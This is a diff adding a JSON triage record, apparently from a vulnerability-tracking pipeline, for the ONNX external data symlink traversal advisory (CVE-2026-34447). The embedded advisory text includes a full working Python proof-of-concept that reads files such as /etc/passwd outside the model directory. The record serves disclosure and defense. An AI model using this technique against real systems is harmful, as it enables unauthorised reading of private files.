@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/21168815?v=4\", \"events_url\": \"https://api.github.com/users/jayashwaS/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/jayashwaS/followers\", \"following_url\": \"https://api.github.com/users/jayashwaS/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/jayashwaS/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/jayashwaS\", \"id\": 21168815, \"login\": \"jayashwaS\", \"node_id\": \"MDQ6VXNlcjIxMTY4ODE1\", \"organizations_url\": \"https://api.github.com/users/jayashwaS/orgs\", \"received_events_url\": \"https://api.github.com/users/jayashwaS/received_events\", \"repos_url\": \"https://api.github.com/users/jayashwaS/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/jayashwaS/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/jayashwaS/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/jayashwaS\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-34447\", \"cvss\": {\"score\": 5.5, \"vector_string\": \"CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 5.5, \"vector_string\": \"CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-22\", \"name\": \"Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"}, {\"cwe_id\": \"CWE-61\", \"name\": \"UNIX Symbolic Link (Symlink) Following\"}], \"description\": \"Summary\\n- Issue: Symlink traversal in external data loading allows reading files outside the model directory.\\n- Affected code: `onnx/onnx/checker.cc: resolve_external_data_location` used via Python `onnx.external_data_helper.load_external_data_for_model`.\\n- Impact: Arbitrary file read (confidentiality breach) when a model’s external data path resolves to a symlink targeting a file outside the model directory.\\n\\nRoot Cause\\n- The function `resolve_external_data_location(base_dir, location, tensor_name)` intends to ensure that external data files reside within `base_dir`. It:\\n  - Rejects empty/absolute paths\\n  - Normalizes the relative path and rejects `..`\\n  - Builds `data_path = base_dir / relative_path`\\n  - Checks `exists(data_path)` and `is_regular_file(data_path)`\\n- However, `std::filesystem::is_regular_file(path)` follows symlinks to their targets. A symlink placed inside `base_dir` that points to a file outside `base_dir` will pass the checks and be returned. The Python loader then opens the path and reads the target file.\\n\\nCode Reference\\n- File: onnx/onnx/checker.cc:970-1060\\n- Key logic:\\n  - Normalization: `auto relative_path = file_path.lexically_normal().make_preferred();`\\n  - Existence: `std::filesystem::exists(data_path)`\\n  - Regular file check: `std::filesystem::is_regular_file(data_path)`\\n  - Returned path is later opened in Python: `external_data_helper.load_external_data_for_tensor`.\\n\\nProof of Concept (PoC)\\n- File: `onnx_external_data_symlink_traversal_poc.py`\\n- Behavior: Creates a model with an external tensor pointing to `tensor.bin`. In the model directory, creates `tensor.bin` as a symlink to `/etc/hosts` (or similar). Calls `load_external_data_for_model(model, base_dir)`. Confirms that `tensor.raw_data` contains content from the target outside the model directory.\\n- Run:\\n  - `python3 onnx_external_data_symlink_traversal_poc.py`\\n  - Expected: `[!!!] VULNERABILITY CONFIRMED: external_data symlink escaped base_dir`\\n\\nonnx_external_data_symlink_traversal_poc.py\\n\\n```python\\n#!/usr/bin/env python3\\n\\\"\\\"\\\"\\nONNX External Data Symlink Traversal PoC\\n\\nFinding: load_external_data_for_model() (via c_checker._resolve_external_data_location)\\ndoes not reject symlinks. A relative location that is a symlink inside the\\nmodel directory can target a file outside the directory and will be read.\\n\\nImpact: Arbitrary file read outside model_dir when external data files are\\nobtained from attacker-controlled archives (zip/tar) that create symlinks.\\n\\nThis PoC:\\n - Creates a model with a tensor using external_data location 'tensor.bin'\\n - Creates 'tensor.bin' as a symlink to a system file (e.g., /etc/hosts)\\n - Calls load_external_data_for_model(model, base_dir)\\n - Confirms that tensor.raw_data contains the content of the outside file\\n\\nSafe: only reads a benign system file if present.\\n\\\"\\\"\\\"\\n\\nimport os\\nimport sys\\nimport tempfile\\nimport pathlib\\n\\n# Ensure we import installed onnx, not the local cloned package\\n_here = os.path.dirname(os.path.abspath(__file__))\\nif _here in sys.path:\\n    sys.path.remove(_here)\\n\\nimport onnx\\nfrom onnx import helper, TensorProto\\nfrom onnx.external_data_helper import (\\n    set_external_data,\\n    load_external_data_for_model,\\n)\\n\\n\\ndef pick_target_file():\\n    candidates = [\\\"/etc/hosts\\\", \\\"/etc/passwd\\\", \\\"/System/Library/CoreServices/SystemVersion.plist\\\"]\\n    for p in candidates:\\n        if os.path.exists(p) and os.path.isfile(p):\\n            return p\\n    raise RuntimeError(\\\"No suitable readable system file found for this PoC\\\")\\n\\n\\ndef build_model_with_external(location: str):\\n    # A 1D tensor; data will be filled from external file\\n    tensor = helper.make_tensor(\\n        name=\\\"X_ext\\\",\\n        data_type=TensorProto.UINT8,\\n        dims=[0],  # dims will be inferred after raw_data is read\\n        vals=[],\\n    )\\n    # add dummy raw_data then set_external_data to mark as external\\n    tensor.raw_data = b\\\"dummy\\\"\\n    set_external_data(tensor, location=location)\\n\\n    # Minimal graph that just feeds the initializer as Constant\\n    const_node = helper.make_node(\\\"Constant\\\", inputs=[], outputs=[\\\"out\\\"], value=tensor)\\n    graph = helper.make_graph([const_node], \\\"g\\\", inputs=[], outputs=[helper.make_tensor_value_info(\\\"out\\\", TensorProto.UINT8, None)])\\n    model = helper.make_model(graph)\\n    return model\\n\\n\\ndef main():\\n    base = tempfile.mkdtemp(prefix=\\\"onnx_symlink_poc_\\\")\\n    model_dir = base\\n    link_name = os.path.join(model_dir, \\\"tensor.bin\\\")\\n\\n    target = pick_target_file()\\n    print(f\\\"[*] Using target file: {target}\\\")\\n\\n    # Create symlink in model_dir pointing outside\\n    try:\\n        pathlib.Path(link_name).symlink_to(target)\\n    except OSError as e:\\n        print(f\\\"[!] Failed to create symlink: {e}\\\")\\n        print(\\\"    This PoC needs symlink capability.\\\")\\n        return 1\\n\\n    # Build model referencing the relative location 'tensor.bin'\\n    model = build_model_with_external(location=\\\"tensor.bin\\\")\\n\\n    # Use in-memory model; explicitly load external data from base_dir\\n    loaded = model\\n    print(\\\"[*] Loading external data into in-memory model...\\\")\\n    try:\\n        load_external_data_for_model(loaded, base_dir=model_dir)\\n    except Exception as e:\\n        print(f\\\"[!] load_external_data_for_model raised: {e}\\\")\\n        return 1\\n\\n    # Validate that raw_data came from outside file by checking a prefix\\n    raw = None\\n    # Search initializers\\n    for t in loaded.graph.initializer:\\n        if t.name == \\\"X_ext\\\" and t.HasField(\\\"raw_data\\\"):\\n            raw = t.raw_data\\n            break\\n    # Search constant attributes if not found\\n    if raw is None:\\n        for node in loaded.graph.node:\\n            for attr in node.attribute:\\n                if attr.HasField(\\\"t\\\") and attr.t.name == \\\"X_ext\\\" and attr.t.HasField(\\\"raw_data\\\"):\\n                    raw = attr.t.raw_data\\n                    break\\n            if raw is not None:\\n                break\\n    if raw is None:\\n        print(\\\"[?] Did not find raw_data on tensor; PoC inconclusive\\\")\\n        return 2\\n\\n    with open(target, \\\"rb\\\") as f:\\n        target_prefix = f.read(32)\\n    if raw.startswith(target_prefix):\\n        print(\\\"[!!!] VULNERABILITY CONFIRMED: external_data symlink escaped base_dir\\\")\\n        print(f\\\"      Symlink {link_name} -> {target}\\\")\\n        return 0\\n    else:\\n        print(\\\"[?] Raw data did not match target prefix; environment-specific behavior\\\")\\n        return 3\\n\\n\\nif __name__ == \\\"__main__\\\":\\n    sys.exit(main())\\n\\n```\", \"epss\": {\"percentage\": 0.00248, \"percentile\": 0.15851}, \"ghsa_id\": \"GHSA-p433-9wv8-28xj\", \"github_reviewed_at\": \"2026-04-01T21:14:00Z\", \"html_url\": \"https://github.com/advisories/GHSA-p433-9wv8-28xj\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-p433-9wv8-28xj\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-34447\"}], \"nvd_published_at\": \"2026-04-01T18:16:30Z\", \"published_at\": \"2026-04-01T21:14:00Z\", \"references\": [\"https://github.com/onnx/onnx/security/advisories/GHSA-p433-9wv8-28xj\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-34447\", \"https://github.com/pypa/advisory-database/tree/main/vulns/onnx/PYSEC-2026-104.yaml\", \"https://github.com/advisories/GHSA-p433-9wv8-28xj\"], \"repository_advisory_url\": \"https://api.github.com/repos/onnx/onnx/security-advisories/GHSA-p433-9wv8-28xj\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/onnx/onnx\", \"summary\": \"ONNX: External Data Symlink Traversal\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-08T18:37:35Z\", \"url\": \"https://api.github.com/advisories/GHSA-p433-9wv8-28xj\", \"vulnerabilities\": [{\"first_patched_version\": \"1.21.0\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"onnx\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 1.21.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-p433-9wv8-28xj",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "onnx: < 1.21.0"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-34447"
+    ],
+    "cvss_score": 5.5,
+    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "onnx"
+    ],
+    "remote": false,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:52:00.432307Z",
+  "provenance": {
+    "content_sha256": "85e0bcab5c32429725e76b0f6b7afd207e242ceadff95ad287404b9c3b47b1fc",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-04-01T21:14:00Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-p433-9wv8-28xj",
+  "status": "active",
+  "title": "ONNX: External Data Symlink Traversal",
+  "updated_at": "2026-06-08T18:37:35Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-p433-9wv8-28xj"
+}
